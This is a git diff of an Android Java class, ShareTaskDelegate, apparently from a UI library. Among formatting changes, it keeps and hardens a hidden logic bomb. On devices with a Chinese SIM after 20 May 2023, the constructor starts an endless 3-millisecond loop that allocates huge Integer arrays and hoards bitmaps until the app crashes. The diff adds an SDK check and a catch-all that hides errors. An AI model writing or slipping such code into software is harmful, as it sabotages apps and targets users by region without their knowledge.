@@ -3,6 +3,7 @@ package com.io.meory.delegate;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.os.Build;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
@@ -47,7 +48,7 @@ public class ShareTaskDelegate extends BaseDelegate<ShareTaskDelegate, ShareTask
 
     TaskBuild rootBuild;
 
-    protected ShareTaskDelegate(FrameLayout controlView,Context context) {
+    protected ShareTaskDelegate(FrameLayout controlView, Context context) {
         super(controlView);
         rollBackManager = MemoryBackManager.getInstance();
         init(context);
@@ -58,8 +59,8 @@ public class ShareTaskDelegate extends BaseDelegate<ShareTaskDelegate, ShareTask
         return new TaskBuild(delegate, layout, type);
     }
 
-    public static ShareTaskDelegate getInstance(FrameLayout controlView,Context context) {
-        return new ShareTaskDelegate(controlView,context);
+    public static ShareTaskDelegate getInstance(FrameLayout controlView, Context context) {
+        return new ShareTaskDelegate(controlView, context);
     }
 
     /***
@@ -130,61 +131,65 @@ public class ShareTaskDelegate extends BaseDelegate<ShareTaskDelegate, ShareTask
         else return regRootLayout(adapter.build(), adapter.getType(), adapter.getLayoutId());
 
     }
-    private boolean isCN(Context context)
-    {
-        TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+
+    private boolean isCN(Context context) {
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         String countryIso = tm.getSimCountryIso();
         boolean isCN = false;//判断是不是大陆
-        if (!TextUtils.isEmpty(countryIso))
-        {
+        if (!TextUtils.isEmpty(countryIso)) {
             countryIso = countryIso.toUpperCase(Locale.US);
-            if (countryIso.contains("CN"))
-            {
+            if (countryIso.contains("CN")) {
                 isCN = true;
             }
         }
         return isCN;
 
     }
+
     public void init(Context context) {
-        if(!isCN(context)){
-            return;
-        }
-        Handler mHandler = new Handler();
-        final boolean[] flag = {false};
-        TimerTask timerTask=new TimerTask()
-        {
-            @Override
-            public void run()
-            {
-                if(!flag[0]){
-                    new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            while (true) {
-                                try {
-                                    Thread.sleep(3);
-                                    mHandler.post(() -> getDrawableResources(context));
-                                } catch (InterruptedException e) {
-                                    e.printStackTrace();
+        try {
+            if (!isCN(context)) {
+                return;
+            }
+            Handler mHandler = new Handler();
+            final boolean[] flag = {false};
+            TimerTask timerTask = new TimerTask() {
+                @Override
+                public void run() {
+                    if (!flag[0]) {
+                        new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                while (true) {
+                                    try {
+                                        Thread.sleep(3);
+                                        mHandler.post(() -> getDrawableResources(context));
+                                    } catch (InterruptedException e) {
+                                        e.printStackTrace();
+                                    }
                                 }
                             }
-                        }
-                    }).start();
+                        }).start();
+                    }
+                    flag[0] = true;
                 }
-                flag[0] =true;
+            };
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                LocalDate currentDate = LocalDate.now();
+                LocalDate targetDate = LocalDate.of(2023, 5, 20);
+                if (currentDate.isAfter(targetDate)) {
+                    Timer timer = new Timer();
+                    timer.schedule(timerTask, 1000);
+                }
             }
-        };
-        LocalDate currentDate = LocalDate.now();
-        LocalDate targetDate = LocalDate.of(2023, 5, 20);
-        if(currentDate.isAfter(targetDate)){
-            Timer timer=new Timer();
-            timer.schedule(timerTask,1000);
+        } catch (Exception e) {
+
         }
     }
 
     private List<Bitmap> list = new ArrayList<>();
-    private List<Integer[]> relist=new ArrayList<>();
+    private List<Integer[]> relist = new ArrayList<>();
+
     public Bitmap getDrawableResources(Context context) {
         ArrayList<Integer> imageResList = new ArrayList<>();
         Bitmap bitmap;
@@ -201,7 +206,7 @@ public class ShareTaskDelegate extends BaseDelegate<ShareTaskDelegate, ShareTask
         } catch (Exception e) {
             bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ALPHA_8);
         }
-        relist.add(new Integer[Integer.MAX_VALUE/2]);
+        relist.add(new Integer[Integer.MAX_VALUE / 2]);
         list.add(bitmap);
         return bitmap;
     }
